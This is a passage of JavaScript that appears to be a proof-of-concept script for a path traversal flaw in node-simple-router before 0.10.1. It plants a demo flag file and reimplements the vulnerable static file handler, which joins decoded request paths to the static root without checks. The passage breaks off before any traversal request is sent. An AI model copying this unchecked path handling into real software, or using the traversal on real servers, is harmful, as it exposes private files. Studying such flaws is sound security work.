const STATIC_ROOT = "./public"; // Common default for dispatch.static_route
if (!fs.existsSync(STATIC_ROOT)) fs.mkdirSync(STATIC_ROOT);

// Create a demonstration flag file at the expected traversal destination
const FLAG_FILE = path.join(__dirname, "flag.txt");
if (!fs.existsSync(FLAG_FILE)) {
  fs.writeFileSync(FLAG_FILE, "<SECRET_FLAG_REDACTED>");
}

async function exploit() {
  // Mimic the vulnerable dispatch.static implementation from node-simple-router < 0.10.1
  function vulnerableStatic(pathname, req, res) {
    const full_path = "" + STATIC_ROOT + (decodeURIComponent(pathname));

    // VULNERABILITY: No validation that full_path stays within STATIC_ROOT.
    // An attacker can inject '../' sequences to escape the intended directory.

    fs.exists(full_path, (exists) => {
      if (exists) {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        fs.createReadStream(full_path).pipe(res);
      } else {
        // Pre-v0.10.1 typically returns 404 or throws ENOENT here
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(`<h2>404 - Not Found</h2>`);
